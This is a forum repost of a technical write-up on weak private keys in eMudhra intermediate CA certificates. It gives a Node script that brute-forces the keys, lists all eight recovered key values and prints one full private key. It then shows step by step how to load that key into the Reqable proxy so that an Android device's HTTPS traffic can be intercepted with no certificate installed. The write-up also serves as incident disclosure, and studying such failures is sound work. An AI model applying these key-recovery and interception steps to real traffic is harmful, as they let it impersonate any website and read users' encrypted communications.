> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-293329.htm)

> 看雪安全社区是一个非营利性质的技术交流平台，致力于汇聚全球的安全研究者和开发者，专注于软件与系统安全、逆向工程、漏洞研究等领域的深度技术讨论与合作。

原文链接：https://yuhuantin.icu/2026/10/26/eMudhra-CA-%E5%88%A9%E7%94%A8/  
准备工具: OpenSSL、Node

TLS 证书是一条签名链。客户端信任库里只有根证书，中间层和叶子层由服务器在握手时提供，逐级验证签名

```
graph LR
    R["根证书<br/>客户端信任库里已有的证书"] --> I["中级 CA<br/>签发叶证书"]
    I --> L["叶证书<br/>某个域名"]
```

中级 CA 的私钥用来给叶证书签名。拿到这个私钥，就能给任意域名签出链条完整、签名有效的叶证书，等于拿到了冒充任意网站的能力。

ECDSA 用到的量：

<table><thead><tr><th>符号</th><th>含义</th></tr></thead><tbody><tr><td><code>O</code></td><td>单位元，椭圆曲线上的无穷远点</td></tr><tr><td><code>G</code></td><td>（定值）基点，曲线参数中固定的一个点，所有 P-384 密钥共用</td></tr><tr><td><code>n</code></td><td>（定值）<code>G</code> 的整数阶，满足 <code>n × G = O</code> 的最小正整数</td></tr><tr><td><code>Q</code></td><td>公钥，曲线上的一个点</td></tr><tr><td><code>d</code></td><td>私钥，从 <code>[1, n-1]</code> 中<strong>随机</strong>选取的整数</td></tr></tbody></table>

公钥由私钥算出：

```
Q = d × G
```

`G` 乘上 `n` 得到单位元 `O`，乘上 `n+1` 回到 `G`，序列开始循环：

```
n × G = O
(n + 1) × G = G
```

所以私钥 `d` 只需从 `[1, n-1]` 中选取。`n` 是曲线参数里的固定常数，P-384 的 `n` 是一个 384 位的素数：

```
n = FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7634D81F4372DDF581A0DB248B0A77AECEC196ACCC52973
```

而这批证书的 `d` 全部小于 256，候选只有 255 个。把 `d` 从 1 开始逐个代入 `d × G`，与证书里的公钥比对即可。前几个 `d` 算出的完整公钥：

<table><thead><tr><th>d</th><th>x (前 16 字节)</th><th>y(前 16 字节)</th></tr></thead><tbody><tr><td>1</td><td><code>aa87ca22be8b05378eb1c71ef320ad74...</code></td><td><code>3617de4a96262c6f5d9e98bf9292dc29...</code></td></tr><tr><td>2</td><td><code>08d999057ba3d2d969260045c55b97f0...</code></td><td><code>8e80f1fa5b1b3cedb7bfe8dffd6dba74...</code></td></tr><tr><td>3</td><td><code>077a41d4606ffa1464793c7e5fdc7d98...</code></td><td><code>c995f7ca0b0c42837d0bbe9602a9fc99...</code></td></tr><tr><td>4</td><td><code>138251cd52ac9298c1c8aad977321deb...</code></td><td><code>cacae29869a62e1631e8a28181ab5661...</code></td></tr><tr><td>5</td><td><code>11de24a2c251c777573cac5ea025e467...</code></td><td><code>8fa696c77440f92d0f5837e90a00e7c5...</code></td></tr></tbody></table>

`d = 1` 那行就是基点 `G` 本身。`d = 4` 那行的 x、y 与 `EM-OV-TLS-CA-G3C-emSign.pem` 证书里的公钥逐字节相同，下面是该证书的完整公钥点：

```
04:13:82:51:cd:52:ac:92:98:c1:c8:aa:d9:77:32:1d
eb:97:e7:09:bd:0b:4c:a0:ac:a5:5d:c8:ad:51:dc:fc
9d:15:89:a1:59:7e:3a:51:20:e1:ef:d6:31:c6:3e:18
35:ca:ca:e2:98:69:a6:2e:16:31:e8:a2:81:81:ab:56
61:6d:c4:5d:91:8a:bc:09:f3:ab:0e:63:cf:79:2a:a4
dc:ed:73:87:be:37:bb:a5:69:54:9f:1c:02:b2:70:ed
```

公钥开头的 `04` 是 SEC1 定义的未压缩点标记，占 1 字节，说明后面的坐标是完整的 x 和 y。剩下 96 字节依次是 x 与 y，各 48 字节，所以整个公钥点是 97 字节

所以这张证书的私钥就是 4

2025-04-30，eMudhra 生成了一批中级 CA。流程中临时改动了一个脚本用于测试 `wrap/unwrap`，由于脚本缺陷导致多生成了一对密钥，这对密钥的随机数不足。密钥标签相近，生成 CSR 时选中了弱密钥，根证书据此签出证书，同一批 CSR 也送交 Sectigo 做交叉签名

出问题的是 `B`、`C` 两个批次中的 `P-384` 密钥，共 8 个：`DV`、`OV`、`EV` 三类 TLS 中级 CA 各一对（`G3B`、`G3C`），加两个代码签名中级 CA（`OV CS` 的 `G3B`、`G3C`）

每个私钥对应两张证书：eMudhra 自己签发的、Sectigo 交叉签发的。两张证书公钥相同、序列号不同，通向不同的根，合计 16 张

枚举 `d = 1..255` 即可，这里留出余量跑到 4095。用 Node 的 `crypto.createECDH`：

```
const ecdh = crypto.createECDH('secp384r1');
for (let d = 1; d <= 4095; d++) {
  const buf = Buffer.alloc(48);
  buf.writeUInt32BE(d, 44);
  ecdh.setPrivateKey(buf);
  if (ecdh.getPublicKey().equals(point)) break;   // point 取自证书的 SPKI
}
```

完整脚本 [`recover_key.js`](https://bbs.kanxue.com/recover_key.js)，接收证书路径和输出的私钥路径

8 个密钥的结果（只列 `-emSign.pem` 那 8 张）：

<table><thead><tr><th>证书文件</th><th>d</th></tr></thead><tbody><tr><td><code>EM-DV-TLS-CA-G3B-emSign.pem</code></td><td>156</td></tr><tr><td><code>EM-DV-TLS-CA-G3C-emSign.pem</code></td><td>230</td></tr><tr><td><code>EM-EV-TLS-CA-G3B-emSign.pem</code></td><td>115</td></tr><tr><td><code>EM-EV-TLS-CA-G3C-emSign.pem</code></td><td>56</td></tr><tr><td><code>EM-OV-TLS-CA-G3B-emSign.pem</code></td><td>155</td></tr><tr><td><code>EM-OV-TLS-CA-G3C-emSign.pem</code></td><td>4</td></tr><tr><td><code>EM-OV-CS-CA-G3B-emSign.pem</code></td><td>66</td></tr><tr><td><code>EM-OV-CS-CA-G3C-emSign.pem</code></td><td>237</td></tr></tbody></table>

每张证书都有 AAA 交叉签名版，比如 `EM-OV-TLS-CA-G3C-AAA.pem`。两张证书公钥相同，跑脚本会还原出同一个 `d`。所以爆破一遍即可，8 个私钥覆盖 16 张证书

以 `EM-OV-TLS-CA-G3C-emSign.pem` 为例跑一遍，脚本直接输出 PEM：

```
node recover_key.js EM-OV-TLS-CA-G3C-emSign.pem EM-OV-TLS-CA-G3C.key
```

得到的 `EM-OV-TLS-CA-G3C.key` 就是私钥：

```
-----BEGIN PRIVATE KEY-----
MIG2AgEAMBAGByqGSM49AgEGBSuBBAAiBIGeMIGbAgEBBDAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAShZANiAAQTglHNUqyS
mMHIqtl3Mh3rl+cJvQtMoKylXcitUdz8nRWJoVl+OlEg4e/WMcY+GDXKyuKYaaYu
FjHoooGBq1ZhbcRdkYq8CfOrDmPPeSqk3O1zh743u6VpVJ8cArJw7Wc=
-----END PRIVATE KEY-----
```

```
openssl pkey -in EM-OV-TLS-CA-G3C.key -noout -text
```

```
Private-Key: (384 bit)
priv:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:
    00:00:04
pub:
    04:13:82:51:cd:52:ac:92:98:c1:c8:aa:d9:77:32:
    1d:eb:97:e7:09:bd:0b:4c:a0:ac:a5:5d:c8:ad:51:
    dc:fc:9d:15:89:a1:59:7e:3a:51:20:e1:ef:d6:31:
    c6:3e:18:35:ca:ca:e2:98:69:a6:2e:16:31:e8:a2:
    81:81:ab:56:61:6d:c4:5d:91:8a:bc:09:f3:ab:0e:
    63:cf:79:2a:a4:dc:ed:73:87:be:37:bb:a5:69:54:
    9f:1c:02:b2:70:ed:67
ASN1 OID: secp384r1
NIST CURVE: P-384
```

48 字节的私钥里 47 个是 `00`，最后一个是 `04`，有效位仅 1 字节

用这个私钥重新签官方给的 `message.txt`，再用证书里的公钥验证。公钥从 `EM-OV-TLS-CA-G3C-emSign.pem` 里取：

```
openssl x509 -in EM-OV-TLS-CA-G3C-emSign.pem -noout -pubkey > pub.pem

openssl dgst -sha384 -sign EM-OV-TLS-CA-G3C.key -out my.sig message.txt
openssl dgst -sha384 -verify pub.pem -signature my.sig message.txt
# Verified OK
```

签名通过说明这把还原出的私钥与证书里的公钥是同一对。

官方 [proof.zip](https://bbs.kanxue.com/proof.zip) 给的是持有私钥的证明：用同一个 `pub.pem` 去验证官方附带的签名。

```
openssl dgst -sha384 -verify pub.pem -signature EM-OV-TLS-CA-G3C.sig message.txt
# Verified OK
```

两个签名的字节不同（ECDSA 每次签名随机取 `k`），但都能被同一把公钥验证。上一步证明还原出的私钥对应这把公钥，这一步证明官方签名也对应这把公钥，两者合起来说明还原出的私钥与官方的私钥是同一把。

8 组证书与签名都能这样验证，把文件名换成任意一组即可。私钥可被算出这一点，由上面的枚举过程证明。

Reqable 默认给每台设备生成一个自己的根证书，抓 HTTPS 时用它签叶证书，所以正常流程要把这个根装进目标设备。这里把这个根换成 eMudhra 的中级 CA：Reqable 改用该 CA 的私钥签叶证书，链条从叶证书走到中级 CA，再走到客户端本来信任的根，目标设备不需要安装任何根证书。

Reqable 在 3.3.5 引入中间证书支持 [](https://bbs.kanxue.com/elink@ba3K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6J5k6i4q4S2j5X3I4W2i4K6u0r3M7X3g2I4j5h3u0D9k6g2)9J5k6r3q4H3M7q4)9J5c8X3W2K6M7%4g2W2M7#2)9J5c8U0t1&6z5e0t1%60.)github issue

制作 p12，口令设为 `123`。两个根各签了一张证书，公钥相同、签发者不同，按客户端信任的根来选：

走 AAA 根的：

```
openssl pkcs12 -export \
  -inkey EM-OV-TLS-CA-G3C.key \
  -in EM-OV-TLS-CA-G3C-AAA.pem \
  -name "EM OV TLS CA G3C" \
  -passout pass:123 \
  -out emudhra-g3c-aaa.p12
```

走 emSign 根的：

```
openssl pkcs12 -export \
  -inkey EM-OV-TLS-CA-G3C.key \
  -in EM-OV-TLS-CA-G3C-emSign.pem \
  -name "EM OV TLS CA G3C" \
  -passout pass:123 \
  -out emudhra-g3c-emsign.p12
```

导入方式：`证书` 菜单 → `根证书管理` → `导入根证书(.p12)`

使用以下命令进行测试，安卓设备无需安装任何证书：

```
curl -x 192.168.53.69:9000 https://example.com
```

![](https://bbs.kanxue.com/upload/attach/202610/1022681_3RF67H8WSTK8MRN.webp)

`EM OV CS CA - G3C` 分四段：

<table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td><code>EM</code></td><td>eMudhra 前缀</td></tr><tr><td><code>DV</code> / <code>OV</code> / <code>EV</code></td><td>验证等级</td></tr><tr><td><code>TLS</code> / <code>CS</code></td><td>能签发哪类终端证书</td></tr><tr><td><code>G3B</code> / <code>G3C</code></td><td>第几代根体系，这一代的第几批</td></tr></tbody></table>

**验证等级**

<table><thead><tr><th>缩写</th><th>全称</th><th>CA 核实什么</th><th>证书里出现的身份</th></tr></thead><tbody><tr><td>DV</td><td>Domain Validation</td><td>申请人控制该域名</td><td>只有域名</td></tr><tr><td>OV</td><td>Organization Validation</td><td>域名 + 组织的真实存在</td><td>组织名称 + 域名</td></tr><tr><td>EV</td><td>Extended Validation</td><td>在 OV 基础上更严格</td><td>组织名称 + 域名 + 注册地址</td></tr></tbody></table>

验证等级不改变技术上的信任强度，DV 与 EV 在浏览器里走同一条验证路径，差别只在证书里写不写公司名。

**用途**

```
graph TD
    R1["emSign Root TLS CA - G3"] --> T["EM DV / OV / EV TLS CA - G3B、G3C<br/>签发服务器证书"]
    R2["emSign Root CS CA - G3"] --> C["EM OV CS CA - G3B、G3C<br/>签发代码签名证书"]
```

`TLS` 签发服务器证书，`CS`（Code Signing）签发代码签名证书，用于可执行文件、驱动、安装包。代码签名证书的审核等级是 OV，所以写作 `OV CS`。

**代次与批次**

`G3` 是 eMudhra 第三代根体系（ECC P-384），上一代 `G1` 用 RSA。`B`、`C` 是 2025-04-30 那次仪式里 24 个中级 CA 的分批，A 批在 2025 年 5 月撤销并由 A-1 替换。`G3B` 属 `O=eMudhra BV, C=NL`，`G3C` 属 `O=eMudhra Inc, C=US`。

<table><thead><tr><th>格式</th><th>全称</th><th>是什么</th></tr></thead><tbody><tr><td>ASN.1</td><td>Abstract Syntax Notation One</td><td>描述数据结构的标准</td></tr><tr><td>DER</td><td>Distinguished Encoding Rules</td><td>ASN.1 的二进制编码规则</td></tr><tr><td>PEM</td><td>Privacy-Enhanced Mail</td><td>DER 再做 Base64，外面包文本头尾</td></tr><tr><td>PKCS #8</td><td>Public-Key Cryptography Standards #8</td><td>装私钥的 ASN.1 结构</td></tr><tr><td>PKCS #12</td><td>Public-Key Cryptography Standards #12</td><td>装证书链和私钥的加密容器</td></tr></tbody></table>

层次关系：ASN.1 定义 "有哪些字段"，DER 决定 "字节怎么排"，PEM 在 DER 外面套一层文本，PKCS #8 和 PKCS #12 都是 ASN.1 定义的具体结构。

```
graph LR
    A["ASN.1<br/>结构定义"] --> B["DER<br/>二进制编码"]
    B --> C["PEM<br/>Base64 + 文本头尾"]
    A --> D["PKCS #8<br/>私钥结构"]
    A --> E["PKCS #12<br/>容器结构"]
    D --> B
    E --> B
```

扩展名只是约定。`.pem`、`.crt`、`.cer`、`.der` 都可能装 PEM 或 DER，判断依据是文件开头：`-----BEGIN` 是 PEM，首字节 `0x30` 是 DER

ASN.1 是一种描述数据结构的标准，规定 "一个私钥由哪些字段组成、每个字段是什么类型"，不管这些字段怎么变成字节。

一份私钥的 ASN.1 结构叫 PKCS #8 `PrivateKeyInfo`。这份私钥的 `PrivateKeyInfo` 是三段：

<table><thead><tr><th>字段</th><th>类型</th><th>内容</th></tr></thead><tbody><tr><td>version</td><td>INTEGER</td><td>0</td></tr><tr><td>privateKeyAlgorithm</td><td>SEQUENCE</td><td>算法标识，写 EC 和曲线名</td></tr><tr><td>privateKey</td><td>OCTET STRING</td><td>私钥本体，本身又是一段 ASN.1</td></tr></tbody></table>

第三段里装的是 RFC 5915 定义的 `ECPrivateKey`，后两个字段都可以省略：

<table><thead><tr><th>字段</th><th>类型</th><th>内容</th></tr></thead><tbody><tr><td>version</td><td>INTEGER</td><td>1</td></tr><tr><td>privateKey</td><td>OCTET STRING</td><td>私钥标量，48 字节</td></tr><tr><td>parameters</td><td><code>[0]</code></td><td>曲线，可省略</td></tr><tr><td>publicKey</td><td><code>[1]</code></td><td>公钥点，97 字节，可省略</td></tr></tbody></table>

DER 是 ASN.1 的一种编码规则，规定字段怎么变成字节，每个值都是三段：

<table><thead><tr><th>段</th><th>含义</th></tr></thead><tbody><tr><td>Tag</td><td>一个字节，说明这个值是什么类型</td></tr><tr><td>Length</td><td>长度，短格式占 1 字节；最高位为 1 时表示长格式，低 7 位是后续长度字节的个数</td></tr><tr><td>Value</td><td>内容，定长类型就是原始字节，复合类型就是内嵌的其他 TLV</td></tr></tbody></table>

常见 Tag：

<table><thead><tr><th>Tag</th><th>类型</th></tr></thead><tbody><tr><td><code>30</code></td><td>SEQUENCE，有序的复合结构</td></tr><tr><td><code>02</code></td><td>INTEGER</td></tr><tr><td><code>04</code></td><td>OCTET STRING，一段字节序列</td></tr><tr><td><code>06</code></td><td>OBJECT IDENTIFIER，带点号的标识</td></tr><tr><td><code>03</code></td><td>BIT STRING</td></tr><tr><td><code>a0</code> / <code>a1</code></td><td><code>[0]</code> / <code>[1]</code> 上下文标签，表示可选字段</td></tr></tbody></table>

例如通过 cyberchef `Parse ASN.1 hex string` 组件就可查看

```
SEQUENCE
  INTEGER 00
  SEQUENCE
    ObjectIdentifier ecPublicKey (1 2 840 10045 2 1)
    ObjectIdentifier secp384r1 (1 3 132 0 34)
  OCTETSTRING, encapsulates
    SEQUENCE
      INTEGER 01
      OCTETSTRING 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009c
      [1]
        BITSTRING 0004e79ed9c04a9773c4735e51111da85ac2bd5e64ab374b80e12cbc2038ec1e4f0e3b812fc9859e1e67afb04e2f8bc97f7485ba65aa911ee8a4e45b62d5cc03d56be678b3c38cb4dc937ca2460e238453c892935d29d44f91e15606b63ccedab468
```

PEM 把 DER 做 Base64，每 64 个字符换一行，首尾各加一行标记：

```
-----BEGIN CERTIFICATE-----
MIIDzjCCAragAwIBAgIRAKAk/fS6Zlx4XOSgIEg4WLcwDQYJKoZIhvcNAQELBQAw
ezELMAkGA1UEBhMCR0IxGzAZBgNVBAgMEkdyZWF0ZXIgTWFuY2hlc3RlcjEQMA4G
...
-----END CERTIFICATE-----
```

首尾两行的标记叫 label，说明里面装的是什么：

<table><thead><tr><th>label</th><th>内容</th></tr></thead><tbody><tr><td><code>CERTIFICATE</code></td><td>X.509 证书</td></tr><tr><td><code>PRIVATE KEY</code></td><td>PKCS #8 私钥</td></tr><tr><td><code>EC PRIVATE KEY</code></td><td>传统 EC 私钥，没有 PKCS #8 外层</td></tr><tr><td><code>RSA PRIVATE KEY</code></td><td>传统 RSA 私钥</td></tr><tr><td><code>PUBLIC KEY</code></td><td>公钥</td></tr></tbody></table>

Base64 是可逆的文本编码，转回二进制就是 DER：

```
openssl x509 -in cert.pem -outform DER -out cert.der   # PEM 证书 → DER
openssl x509 -inform DER -in cert.der -out cert.pem    # DER 证书 → PEM
```

一个文件里首尾相接放多张证书，就是证书链或 CA bundle，验证时会按顺序逐张尝试：

```
grep -c "BEGIN CERTIFICATE" bundle.pem
```

PKCS #12 是容器，把证书链和私钥装进一个文件，扩展名 `.p12` 或 `.pfx`。抓包工具需要同时拿到证书和私钥，所以用这个格式。制作方法见上面的 [Reqable](#reqable) 一节。

*   事件页面：https://emudhra.we-have-a-problem.com/
*   Reqable 文档：https://github.com/reqable/reqable-docs

[冰与火的战歌：Windows 内核攻防实战高级班！从零到实战，融合 AI 与 Windows 内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)